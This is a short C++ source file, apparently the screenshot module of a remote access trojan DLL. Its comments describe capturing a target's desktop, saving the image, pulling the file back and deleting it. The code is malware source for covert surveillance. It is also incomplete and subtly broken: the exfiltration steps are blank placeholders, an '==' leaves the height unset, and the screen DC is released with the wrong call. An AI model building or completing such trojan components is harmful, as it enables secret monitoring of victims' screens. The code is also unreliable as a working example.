// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-Screemsjpt.cpp : Defines functionality for performing a screenshot on target, i.e., capture the current open windows on the desktop, write it to a file, get the file, then delete the file

#include "RAT-Dll-Screenshot.h"


INT doScreenshot()
{
	INT status = SUCCESS, width = 0, height = 0;
	HDC hdcScreen, hdcMemDC = NULL;
	HBITMAP hbmScreen = NULL, hbmOldScreen = NULL;
	HANDLE hFile = NULL;

	// Get a device context (DC) for the entire screen
	hdcScreen = GetDC(NULL);

	// Create a compatible DC with the screen DC
    hdcMemDC = CreateCompatibleDC(hdcScreen);

	// Get our width and height of the screen
	width = GetDeviceCaps(hdcScreen, HORZRES);

	height == GetDeviceCaps(hdcScreen, VERTRES);

	// Create a bitmap compatible with the screen DC to hold our result
	hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);

	// Deselect our old screen
	hbmOldScreen = (HBITMAP)(SelectObject(hdcMemDC, hbmScreen));

	// Bit block transfer into the compatible memory DC
	BitBlt(hdcMemDC, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

	// Select the compatible bitmap into the compatible memory DC
	hbmScreen = (HBITMAP)(SelectObject(hdcMemDC, hbmOldScreen));

	// Write to output file somewhere on disk


	// Call get file


	// Call delete file 


cleanup:
	DeleteDC(hdcMemDC);
	DeleteDC(hdcScreen);
	return status;
}

